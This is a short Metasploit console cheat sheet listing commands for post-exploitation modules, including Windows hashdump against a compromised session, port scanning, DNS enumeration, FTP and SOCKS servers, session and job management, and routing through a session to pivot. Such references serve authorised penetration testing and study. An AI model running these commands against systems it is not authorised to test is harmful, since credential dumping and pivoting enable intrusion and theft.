# Metasploit

## Modules

### Post Modules

`Post Modules` 

    meterpreter > run post/multi/gather/env

`Post Modules on a Backgrounded Session`

    msf > use post/windows/gather/hashdump
    msf > show options
    msf > set SESSION 1
    msf > run

### Auxiliary Modules

`Port Scanner`

    msf > use
    auxiliary/scanner/portscan/tcp
    msf > set RHOSTS 10.10.10.0/24
    msf > run

`DNS Enumeration`

    msf > use auxiliary/gather/dns_enum
    msf > set DOMAIN target.tgt
    msf > run

`FTP Server`

    msf > use auxiliary/server/ftp
    msf > set FTPROOT /tmp/ftproot
    msf > run

`Proxy Server`

    msf > use auxiliary/server/socks4
    msf > run

------

## Sessions

`Single Session Exploitation`

Run the exploit expecting a single session that is
immediately backgrounded:

    msf > exploit -z

`Multiple Session Exploitation`

Run the exploit in the background expecting one or
more sessions that are immediately backgrounded:

    msf > exploit –j

`List all Current Jobs`

    msf > jobs –l

`Kill a Job`

    msf > jobs –k [JobID]

`List All Backgrounded Sessions`

    msf > sessions -l

`Interact With a Backgrounded Sessions`

    msf > session -i [SessionID]

`Background the Current Interactive Session`

    meterpreter > <Ctrl+Z>

or

    meterpreter > background

`Routing Through Sessions`

All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session:  

    msf > route add [Subnet to Route To] [Subnet Netmask] [SessionID]